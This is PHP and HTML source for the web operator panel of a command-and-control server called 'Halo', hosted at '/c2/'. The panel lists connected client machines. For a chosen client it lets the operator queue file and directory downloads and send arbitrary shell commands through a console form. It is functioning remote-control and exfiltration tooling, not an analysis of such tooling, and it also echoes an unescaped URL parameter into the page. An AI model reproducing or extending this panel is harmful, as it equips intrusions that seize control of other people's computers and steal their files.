<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require "vendor/autoload.php";
use Halo\Tasks\TasksListener;
use Halo\Requests\RequestListener;
use Halo\Controllers\ClientsController;
use Halo\Installation\Installation;
use Halo\Config\Config;
use Halo\DataManagement\DataManagementListener;

$config = Config::getInstance(realpath(__DIR__) . '/');

if (!file_exists($config->getFromConfig('installedFile')))
	Installation::install();

DataManagementListener::listenForDataRequest();
TasksListener::waitForAddTaskRequest();
RequestListener::waitForRequest();

$clientsController = new ClientsController;
$clients = $clientsController->getClients();

$currentClientId = null;
if (isset($_GET['client_id']))
	$currentClientId = $_GET['client_id'];

$base_url = '/c2/';

// $clientsController->addClient(['client_id' => 'sda-12a-23x', 'os' => 'Windows', 'Hostname' => 'name', 'IP' => '127.0.0.1']);

?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Halo</title>
	<style>
		* {box-sizing: border-box;}
		body, html { margin:0; padding:0; }
		body {font-family: cursive; position: relative;}
		nav {
			display: inline-block;
			width: 100%;
			color: #afafaf;
			padding: 20px 0;
			background-color: #313131;
		}
		.content {
			width: 1200px;
			margin: 0 auto;
		}
		.clients-container {
			position: absolute;
			top: 80px;
			right: 20px;
			width: 300px;
		}
		.clients-container h3 {
			color: #afafaf;
			display: inline-block;
			width: 100%;
			background-color: #313131;
			padding: 15px;
			font-size: 13px;
		}
		.clients-container ul {
			border: 1px solid #afafaf;
			border-top: none;
		} 
		.clients-container ul li a {
			display: inline-block;
			width: 100%;
			padding: 10px 15px;
			color: #afafaf;
			transition: .35s;
		}
		.clients-container ul li a:hover {
			color: #1899d6;
		}
		.clients-container ul li.active a {
			background-color: #1899d6;
			color: white;
		}
		ul {
			list-style: none;
			margin: 0;
			padding: 0;
		}
		a {text-decoration: none;}
		h1, h2, h3, h4, h5, h6 {margin: 0;padding: 0;}
		.tasks-container {
			display: inline-block;
			width: 100%;
			padding: 10px 20px;
			border: 1px solid #afafaf;
		}
		.tasks-container h4 {
			margin: 0 0 10px 0;

		}
		.tasks-container input {
			margin: 0 0 10px 0;
		}
		.tasks {
			margin: 17px 0 0 0;
		}
		.tasks .tasks-inner {
			padding: 0 40px 0 0;
			display: flex;
			justify-content: space-between;
		}
		.tasks .tasks-inner .tasks-container {
			width: 48%;
		}
		input[type="text"], textarea {
			display: inline-block;
			width: 100%;
			border: 1px solid #afafaf;
			border-radius: 4px;
			padding: 10px 15px;
		}
		.d_button {
			border: none;
			cursor: pointer;
			background-color: #78c800;
			padding: 9px 25px;
			border-radius: 4px;
			color: white;
		}
		.d_label {
			display: inline-flex;
			align-items: center;
			cursor: pointer;
		}
		.d_label span {
			position: relative;
			top: -2px;
			margin: 0 10px 0 0;
		}
		.d_label input {
			margin: 0;
		}
		.cmd-console {
			position: fixed;
			bottom: 0;
			left: 0;
			width: 100%;
		}
		.console-command-line {
		    background: #1d1e22;
		    padding: 0 8px 0 0;
		    display: -webkit-box;
		    display: -webkit-flex;
		    display: -ms-flexbox;
		    display: flex;
		    -webkit-flex-shrink: 0;
		    -ms-flex-negative: 0;
		    flex-shrink: 0;
		}
		.console-arrow {
		    font-weight: bold;
		    padding-left: 10px;
		    color: #fff;
		}
		.console-arrow i {
			position: relative;
		    top: -3px;
		    font-style: normal;
		}
		.console-arrow.forwards {
		    display: -webkit-box;
		    display: -webkit-flex;
		    display: -ms-flexbox;
		    display: flex;
		    -webkit-box-align: center;
		    -webkit-align-items: center;
		    -ms-flex-align: center;
		    align-items: center;
		}
		.console-command-line-input {
		    background: none;
		    outline: none;
		    -webkit-box-flex: 1;
		    -webkit-flex: 1;
		    -ms-flex: 1;
		    flex: 1;
		    color: white;
		    border: 0;
		    padding: 7px 0 7px 7px;
		    resize: none;
		    overflow: hidden;
		    min-height: 30px;
		}
	</style>
	<style>
		.cmd-output {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: calc(100% - 30px);
			z-index: 99;
			background-color: #1d1e22;
			border-bottom: 2px solid #cacaca;
			padding: 0 20px;
			display: flex;
			justify-content: space-between;
		}
		.no-border {
			border: none!important;
		}
		.no-margin {
			margin: 0!important;
		}
		.cmd-output-left {
			width: 100%;
			padding: 0 100px 0 0;
			overflow-y: auto;
		}
		.cmd-output-right {
			flex: 0 0 330px;
			-webkit-box-shadow: -1px 0px 10px 0px rgba(48,48,48,0.4);
			-moz-box-shadow: -1px 0px 10px 0px rgba(48,48,48,0.4);
			box-shadow: -1px 0px 10px 0px rgba(48,48,48,0.4);
			padding: 0 0 0 30px;
			overflow-y: auto;
		}
		.cmd-output-row {
			color: white;
			padding: 0 0 10px 0;
			margin: 0 0 10px 0;
			border-bottom: 1px solid #525252;
		}
		.cmd-output-row pre {
			font-family: Courier;
			font-size: 13px;
		}
		.cmd-output .cmd-output-row:last-child {
			margin: 0;
			padding: 0;
			border-bottom: none;
		}
	</style>
	<style>
		.console-output-trigger {
			position: absolute;
			top: 8px;
		    right: 11px;
			display: inline-block;
			font-size: 11px;
			color: white;
			font-family: Courier;
			cursor: pointer;
		}
	</style>
</head>
<body>
	<input type="hidden" id="baseUrl" value="<?=$base_url?>">
	<input type="hidden" id="client_id" value="<?=$currentClientId?>">
	<nav>
		<div class="content">
			<strong>Halo</strong>
		</div>
	</nav>
	<?php if ($currentClientId): ?>
	<div class="tasks">
		<div class="content">
			<div class="tasks-inner">
				<div class="tasks-container">
					<h4>Download files</h4>
					<form method="POST" action="<?=$base_url;?>?client_id=<?=$currentClientId?>">
						<input type="text" placeholder="Path to file" name="task[path]">
						<input type="text" placeholder="Threads" name="task[threads]">
						<label class="d_label">
							<span>Directory?</span>
							<input type="checkbox" name="task[is_dir]">
						</label>
						<input type="hidden" value="<?=$currentClientId;?>" name="client_id">
						<input type="hidden" value="addtask" name="addtask">
						<input type="hidden" value="downloadfiles" name="task[type]">
						<div>
						<button type="submit" class="d_button">Add task</button>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
		<?php else: ?>
		<div class="content">
			<div class="tasks">
			<strong>Welcome! Choose the client.</strong>
			</div>
		</div>
	<?php endif; ?>
	<div class="clients-container">
		<h3>Clients</h3>
		<?php if ($clients): ?>
			<ul>
				<?php foreach ($clients as $client): ?>
					<?php if (isset($_GET['client_id']) && $_GET['client_id'] == $client['client_id']): ?>
						<li class="active">
					<?php else: ?>
						<li>
					<?php endif; ?>
						<a href="<?=$base_url;?>?client_id=<?=$client['client_id']; ?>"><?=$client['client_id']; ?></a></li>
				<?php endforeach; ?>
			</ul>
		<?php endif; ?>
	</div>
	<?php if ($currentClientId): ?>
		<div class="cmd-output" style="display: none;">
			<div class="cmd-output-left"></div>
			<div class="cmd-output-right"></div>
		</div>
		<div class="cmd-console">
			<form id="cmd-form" method="POST" action="<?=$base_url;?>">
				<input type="hidden" value="<?=$currentClientId;?>" name="client_id">
				<input type="hidden" value="addtask" name="addtask">
				<input type="hidden" value="cmd" name="task[type]">
				<div class="console-command-line">
					<div class="console-output-trigger">Show console</div>
					<span class="console-arrow forwards"><i>></i></span>
					<textarea name="task[command]" class="console-command-line-input auto-expand" autofocus rows="1" data-min-rows="1"></textarea>
				</div>
			</form>
		</div>
	<?php endif; ?>
	<script src="scripts.js"></script>
</body>
</html>